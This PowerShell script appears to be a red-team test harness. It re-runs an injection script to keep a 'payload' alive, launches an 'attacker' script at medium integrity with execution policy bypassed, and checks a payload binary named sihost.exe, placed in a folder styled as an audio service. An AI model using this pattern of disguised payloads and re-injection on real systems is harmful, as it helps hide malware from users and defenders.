$ErrorActionPreference='Stop'
$OutDir = 'C:\Users\abdul\Desktop\svcldb\tools\redteam\runtime'
$out = Join-Path $OutDir '_test_sihost_medium.out'
$sentinel = Join-Path $OutDir '_test_sihost_medium.done'
$wrapper = Join-Path $env:TEMP 'svc_test_sihost_medium.bat'
Remove-Item $out,$sentinel -EA SilentlyContinue

$attacker = 'C:\Users\abdul\Desktop\svcldb\tools\redteam\_test_sihost_medium.ps1'
$batContent = "@echo off`r`n" +
    "powershell -NoProfile -ExecutionPolicy Bypass -File `"$attacker`" > `"$out`" 2>&1`r`n"
Set-Content -Path $wrapper -Value $batContent -Encoding ASCII

Write-Host "Reinjecting first to make sure payload is alive..."
& powershell -NoProfile -ExecutionPolicy Bypass -File 'C:\Users\abdul\Desktop\svcldb\tools\_reinject.ps1'
Start-Sleep -Seconds 2

Write-Host "spawning medium-IL test..."
& cmd /c "runas /trustlevel:0x20000 `"$wrapper`" 2>&1" | Out-Null
$deadline = (Get-Date).AddSeconds(30)
while ((Get-Date) -lt $deadline -and -not (Test-Path $sentinel)) { Start-Sleep -Milliseconds 300 }
if (-not (Test-Path $sentinel)) { Write-Host 'TIMEOUT'; exit 2 }
Start-Sleep -Milliseconds 200

if (Test-Path $out) {
    Get-Content $out -Raw
} else {
    Write-Host 'no output'
}

Write-Host ""
Write-Host "=== POST-test payload status (from admin) ==="
& 'C:\ProgramData\WinAudioSvc\sihost.exe' --status
Write-Host "post admin status exit=$LASTEXITCODE"

Remove-Item $wrapper -EA SilentlyContinue
